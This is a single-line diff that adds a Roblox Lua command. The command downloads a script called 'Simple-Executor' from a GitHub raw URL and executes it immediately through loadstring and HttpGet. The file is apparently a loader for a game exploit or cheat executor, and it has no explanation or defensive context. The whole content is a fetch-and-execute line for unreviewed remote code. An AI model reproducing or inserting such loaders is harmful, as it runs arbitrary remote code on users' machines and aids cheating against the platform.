@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nickils/Simple-Executor/main/Script.lua"))()
